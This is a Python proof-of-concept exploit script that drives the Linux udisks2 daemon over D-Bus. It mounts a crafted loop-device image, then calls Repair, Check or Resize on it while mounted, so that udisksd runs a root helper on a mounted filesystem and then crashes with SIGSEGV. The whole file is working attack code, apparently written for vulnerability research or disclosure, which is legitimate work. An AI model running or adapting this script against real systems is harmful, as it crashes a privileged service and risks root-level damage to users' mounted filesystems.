#!/usr/bin/env python3
import argparse
import os
import shutil
import subprocess
import sys
import time
from pathlib import Path

import dbus


UDISKS = "org.freedesktop.UDisks2"
MANAGER = "/org/freedesktop/UDisks2/Manager"


def run(argv):
    return subprocess.run(argv, check=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)


def make_image(path: Path, fstype: str) -> None:
    if path.exists():
        path.unlink()
    if fstype == "ext4":
        run(["truncate", "-s", "96M", str(path)])
        run(["mkfs.ext4", "-F", "-q", str(path)])
    elif fstype == "vfat":
        run(["truncate", "-s", "64M", str(path)])
        run(["mkfs.vfat", str(path)])
    elif fstype == "ntfs":
        run(["truncate", "-s", "96M", str(path)])
        run(["mkfs.ntfs", "-F", "-Q", "-L", "UDISKSPOC", str(path)])
    elif fstype == "xfs":
        run(["truncate", "-s", "512M", str(path)])
        run(["mkfs.xfs", "-f", "-q", str(path)])
    elif fstype == "btrfs":
        run(["truncate", "-s", "128M", str(path)])
        run(["mkfs.btrfs", "-q", "-f", str(path)])
    else:
        raise SystemExit(f"unsupported filesystem: {fstype}")


def main() -> int:
    parser = argparse.ArgumentParser(description="Trigger the udisks2 missing-goto root-helper path as an active regular user.")
    parser.add_argument("--fstype", default="ext4", choices=["ext4", "vfat", "ntfs", "xfs", "btrfs"])
    parser.add_argument("--method", default="Repair", choices=["Check", "Repair", "Resize"])
    parser.add_argument("--hold", type=int, default=8, help="seconds to keep the D-Bus unique name alive after the first error")
    args = parser.parse_args()

    uid = os.getuid()
    work = Path(f"/tmp/udisks-missing-goto-poc-{uid}")
    work.mkdir(mode=0o700, exist_ok=True)
    image = work / f"{args.fstype}-{args.method}.img"

    print(f"[+] uid={uid} euid={os.geteuid()} work={work}", flush=True)
    print("[+] creating filesystem image", flush=True)
    make_image(image, args.fstype)

    bus = dbus.SystemBus()
    print(f"[+] system-bus unique name: {bus.get_unique_name()}", flush=True)

    manager_obj = bus.get_object(UDISKS, MANAGER)
    manager = dbus.Interface(manager_obj, f"{UDISKS}.Manager")
    fd = os.open(image, os.O_RDWR)
    try:
        block_path = str(manager.LoopSetup(dbus.types.UnixFd(fd), dbus.Dictionary({}, signature="sv")))
    finally:
        os.close(fd)

    print(f"[+] loop object: {block_path}", flush=True)
    block = bus.get_object(UDISKS, block_path)
    fs = dbus.Interface(block, f"{UDISKS}.Filesystem")

    mountpoint = str(fs.Mount(dbus.Dictionary({}, signature="sv")))
    print(f"[+] mounted at: {mountpoint}", flush=True)
    subprocess.run(["findmnt", mountpoint], text=True)

    print(f"[+] calling Filesystem.{args.method}; initial mounted-state error is expected", flush=True)
    options = dbus.Dictionary({}, signature="sv")
    try:
        if args.method == "Resize":
            fs.Resize(dbus.UInt64(33554432), options, timeout=120)
        elif args.method == "Check":
            fs.Check(options, timeout=120)
        else:
            fs.Repair(options, timeout=120)
    except Exception as exc:
        print(f"[+] first reply: {type(exc).__name__}: {exc}", flush=True)

    print(f"[+] holding D-Bus name for {args.hold}s so udisksd can continue past the stale invocation", flush=True)
    time.sleep(args.hold)
    print("[+] done; root-side strace/gdb should show helper execution and udisksd SIGSEGV", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
